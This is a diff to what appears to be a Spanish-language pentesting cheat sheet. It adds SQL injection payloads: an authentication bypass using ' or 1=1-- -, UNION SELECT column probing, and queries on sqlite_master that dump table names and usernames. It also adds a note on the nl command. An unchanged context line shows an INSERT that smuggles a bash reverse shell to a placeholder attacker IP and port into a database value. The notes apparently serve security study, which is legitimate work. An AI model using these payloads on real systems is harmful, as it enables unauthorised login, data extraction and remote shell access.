@@ -97,6 +97,16 @@ select * from (tabla); [en mysql esto lista toda la tabla de una base de datos]
 
 INSERT INTO (tabla) VALUES ('rev; '$(/bin/bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1")'); [inserta un registro en una tabla que, cuando sea procesado por un script vulnerable, ejecutara una shell reversa hacia la IP y puerto del atacante]
 
+' or 1=1-- - [inyección SQL para saltear autentificacion y extraer una base de datos entera]
+
+select * from (tabla) WHERE usuario='nombre' or 1=1-- - and contraseña='123' [inyección SQL hace que el parametro 1=1-- - deshabilita el campo "and contraseña" porque 1=1 busca todos los usuarios de la tabla]
+
+'UNION SELECT NULL,NULL [inyección SQL que si se conocen la cantidad de columnas con un ataque UNION para extraer datos si son 5 columnas se deben poner 5 NULL]
+
+(consulta)' Union Select name FROM sqlite_master WHERE type='table [sqlite_master es la tabla del sistema en sqlite que almacena las tablas y el esquema de la base de datos]
+
+(consulta)' Union Select username FROM (tabla) WHERE username LIKE '% [WHERE USERNAME LIKE '% es un filtro que extrae cualquier cadena de caracteres]
+
 searchsploit (nombre del exploit) [busca posibles exploits]
 
 
@@ -314,6 +324,8 @@ getent hosts [mapeos de nombres de host a direcciones IP]
 getent services [información de servicios de red y sus puertos]
 
 cat ./directorio [para buscar los archivos de texto]
+
+nl (archivo) [lee todo el archivo y enumera las lineas]
 
 cd .. [te devuelve para atrás]
 
